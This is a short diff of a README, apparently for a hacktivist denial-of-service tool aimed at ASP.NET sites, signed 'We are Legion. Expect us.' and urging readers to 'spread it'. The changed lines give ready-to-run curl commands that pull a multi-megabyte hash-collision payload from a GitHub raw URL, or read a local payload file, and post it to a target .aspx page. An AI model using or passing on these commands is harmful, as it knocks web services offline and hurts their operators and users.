@@ -5,11 +5,9 @@ get it. use it. spread it.
 
 We are Legion. Expect us.
 
-use like this:
+use it your own way.
 
-curl <url> | curl http://target/website.aspx -d@-
-cat PayloadFile | curl http://target/website.aspx -d@-
-or just
-curl http://target/website.aspx -d@/path/to/PayloadFile
-
+curl https://raw.github.com/HybrisDisaster/aspHashDoS/asphashdos.4mb | curl http://target/website.aspx -d@-
+or
+cat asphashdos.1mb | curl http://target/website.aspx -d@-
 
